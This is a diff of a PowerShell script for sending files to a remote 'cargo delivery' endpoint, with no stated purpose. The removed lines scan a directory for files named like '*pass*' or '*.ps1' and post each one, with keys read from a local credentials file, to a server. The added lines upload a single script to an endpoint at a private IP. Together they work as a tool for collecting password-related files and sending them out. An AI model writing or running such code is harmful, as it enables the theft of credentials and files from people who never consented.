@@ -1,65 +1,27 @@
-# Specify the directory to search (replace 'C:\Path\To\Search' with your actual directory)
-$sourceDirectory = 'C:\Path\To\Search'
+# Define variables for the cargo delivery endpoint and file path
+$endpoint = "http://192.168.10.62:5000/cargo_delivery"  # Replace with your actual server endpoint
+$fileToUpload = "Preparer.ps1"  # Replace with the path to your file
 
-# Path to the credentials JSON file
-$credentialsFile = Join-Path -Path $PSScriptRoot -ChildPath 'cred'
+# Define parameters required for cargo delivery
+$espID = "your_esp_id"
+$deliveryKey = "your_delivery_key"
+$encryptionPassword = "your_encryption_password"
 
-# Function to read credentials from JSON file
-function Get-Credentials {
-    $credJson = Get-Content -Path $credentialsFile -Raw | ConvertFrom-Json
-    return $credJson
+# Create hashtable for form data
+$formData = @{
+    esp_id = $espID
+    delivery_key = $deliveryKey
+    encryption_password = $encryptionPassword
+    file = Get-Item $fileToUpload
 }
 
-# Array of file name patterns to search for
-$filePatterns = "*pass*", "*.ps1", "other..."
+# Send file to cargo delivery endpoint using Invoke-RestMethod
+try {
+    $response = Invoke-RestMethod -Uri $endpoint -Method Post -Form $formData -TimeoutSec 60
 
-# Function to send file to API endpoint
-function Send-FileToAPI {
-    param (
-        [string]$filePath,
-        [string]$apiUrl,
-        [string]$espId,
-        [string]$deliveryKey,
-        [string]$encryptionPassword
-    )
-
-    try {
-        # Prepare headers and payload
-        $headers = @{
-            "esp-id" = $espId
-            "delivery-key" = $deliveryKey
-            "encryption-password" = $encryptionPassword
-        }
-        
-        # Send file as binary data to API using Invoke-RestMethod
-        $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -InFile $filePath -ContentType "application/octet-stream"
-        
-        Write-Output "File $($filePath) successfully sent to API."
-    } catch {
-        Write-Output "Failed to send file $($filePath) to API. Error: $_"
-    }
+    # Output response from server
+    Write-Host "Server response: $($response.message)"
 }
-
-# Read credentials from JSON file
-$credentials = Get-Credentials
-
-# Iterate through each file pattern
-foreach ($pattern in $filePatterns) {
-    # Search for files matching the current pattern in the source directory
-    $files = Get-ChildItem -Path $sourceDirectory -Filter $pattern -File -ErrorAction SilentlyContinue
-
-    if ($files) {
-        foreach ($file in $files) {
-            # Send the file to the API
-            Send-FileToAPI -filePath $file.FullName `
-                           -apiUrl ("https://" + $credentials.URL + ":" + $credentials.Port) `
-                           -espId $credentials.esp_id `
-                           -deliveryKey $credentials.delivery_key `
-                           -encryptionPassword $credentials.encryption_password
-        }
-    } else {
-        Write-Output "No files matching pattern '$pattern' found in $sourceDirectory."
-    }
+catch {
+    Write-Host "Error occurred: $_"
 }
-
-Write-Output "Script execution completed."
